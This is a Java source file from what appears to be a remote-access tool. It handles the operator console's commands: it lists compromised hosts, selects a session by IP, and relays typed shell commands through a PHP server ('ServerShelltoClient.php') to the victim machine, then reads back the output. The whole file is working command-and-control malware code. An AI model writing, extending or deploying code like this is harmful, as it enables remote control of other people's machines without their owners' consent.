package net.wind.utils.shell;

import net.wind.BoyLoader;
import net.wind.core.window.ShellWindow;
import net.wind.utils.HttpUtils;

/**
 * createTime 2022/12/3 0003
 * fileName ShellCommand
 *
 * @author WindStream
 */

public class ShellCommand{
    public static String realReturn;
    public static String command(String input) {

        switch (input) {
            case "shell_help":
                realReturn=repOfShell.ShellHelp;
               break;
            case "shell_exit":
                System.exit(0);
                break;
            case "shell_sessions":
                int a = 1;
                String return_string ="";
                for (String Ip : BoyLoader.Host_List) {
                    return_string += (a++) + ": " + Ip + "\n";
                }
                realReturn=return_string;
                break;
            default:
                if(ShellWindow.Session_Status.equals("No Session")){
                    if(input.length()>=13){
                    if(input.substring(0,13).equals("shell_session") == true && input.substring(13,14).equals(" ")) {
                        String ip = input.substring(14);
                        ShellWindow.Session_Status = ip;
                        return "Connect Successfully\n";
                    }
                    }else {
                        return "No command named \""+input+"\"\n";
                    }
            }else{
                    switch (input) {
                        case "shell_help":
                            realReturn=repOfShell.ShellHelp;
                            break;
                        case "shell_exit":
                            System.exit(0);
                            break;
                        case "shell_sessions":
                            int b = 1;
                            String return_stringb ="";
                            for (String Ip : BoyLoader.Host_List) {
                                return_stringb += (b++) + ": " + Ip + "\n";
                            }
                            realReturn=return_stringb;
                            break;
                        default:
                    //HttpUtils.doGet(BoyLoader.phpClient+"/ServerShelltoClient.php?ip="+ShellWindow.Session_Status+"&shell="+input);
                            try {
                                HttpUtils.doGet(BoyLoader.phpClient+"/ServerShelltoClient.php?ip="+ShellWindow.Session_Status+"&shell="+input);
                                Thread.sleep(5000);
                                String reply = HttpUtils.doGet(BoyLoader.phpClient+"/ServerReadClientReply.php?ip="+ShellWindow.Session_Status);
                                ShellWindow.WindowMainArea.append(reply);
                                break;
                            } catch (InterruptedException e) {
                                throw new RuntimeException(e);
                            }
                    }
                }
        }
        return realReturn;
    }
}
